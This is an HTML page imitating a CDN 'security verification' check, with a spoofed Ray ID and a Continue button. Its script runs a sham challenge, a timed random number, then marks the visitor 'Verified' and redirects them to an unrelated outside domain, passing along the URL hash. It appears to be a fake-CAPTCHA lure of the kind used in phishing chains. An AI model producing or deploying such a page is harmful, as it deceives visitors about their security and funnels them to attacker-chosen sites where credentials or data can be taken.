<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Verification</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f3f3f3;font-family:'Segoe UI','Segoe UI Variable',-apple-system,BlinkMacSystemFont,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#ffffff;border:1px solid #e0e0e0;padding:40px 32px 36px;width:380px;text-align:center}
.ico{width:64px;height:64px;background:#ffffff;border:1px solid #cccccc;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.ico svg{width:32px;height:32px;color:#505050}
.ttl{font-size:20px;font-weight:400;color:#1a1a1a;margin-bottom:8px}
.sub{font-size:14px;color:#6c6c6c;margin-bottom:28px;line-height:1.4}
.btn{width:100%;padding:12px 20px;background:#0078d4;color:#ffffff;font-size:14px;font-weight:400;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;user-select:none}
.btn:hover{background:#106ebe}
.btn:active{background:#005a9e}
.btn.v{background:#107c10;cursor:default}
.btn.v:hover{background:#107c10}
#sp{width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top-color:#ffffff;border-radius:50%;animation:spin 0.6s linear infinite;display:none;flex-shrink:0}
.chk{display:none;flex-shrink:0;width:16px;height:16px}
.btn.v .chk{display:block}
.btn.v #sp{display:none}
@keyframes spin{to{transform:rotate(360deg)}}
.foot{margin-top:24px;font-size:11px;color:#a0a0a0}
#rid{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="ico">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
      <circle cx="10" cy="15" r="2"/>
      <path d="M10 17v3"/>
      <path d="M15 8h4a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1h-4"/>
      <path d="M7 8V6a3 3 0 0 1 6 0v2"/>
      <rect x="4" y="8" width="12" height="12" rx="1"/>
    </svg>
  </div>
  <div class="ttl">Verifying connection</div>
  <div class="sub">Please complete security check</div>
  <div class="btn" id="tr">
    <div id="sp"></div>
    <svg class="chk" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <polyline points="20 6 9 17 4 12"></polyline>
    </svg>
    <span id="tx">Continue</span>
  </div>
  <div class="foot">Ray ID: <span id="rid">UNK</span></div>
</div>

<script>
(function() {
    const p = new URLSearchParams(window.location.search);
    var rid_elem = document.getElementById('rid');
    if (rid_elem) rid_elem.textContent = (p.get('ray') || 'UNK').substring(0, 8);

    var b = document.getElementById("tr"), 
        sp = document.getElementById("sp"), 
        tx = document.getElementById("tx"), 
        bg = false;
    
    if (!b || !sp || !tx) return;

    function solveChallenge() {
        return new Promise(resolve => {
            setTimeout(() => {
                resolve({ solution: Math.floor(Math.random() * 999999) });
            }, 1500);
        });
    }

    b.addEventListener("click", async () => {
        if (bg || b.classList.contains("v")) return;
        bg = true;
        sp.style.display = "block";
        tx.textContent = "Verifying...";
        
        try {
            await solveChallenge();
            sp.style.display = "none";
            b.classList.add("v");
            tx.textContent = "Verified";
            
            setTimeout(() => {
                window.location.href = "https://bronzebackguideservice.com/doc/index.html" + window.location.hash;
            }, 600);
        } catch (e) {
            console.error(e);
            sp.style.display = "none";
            tx.textContent = "Retry";
            bg = false;
        }
    });
})();
</script>
</body>
</html>
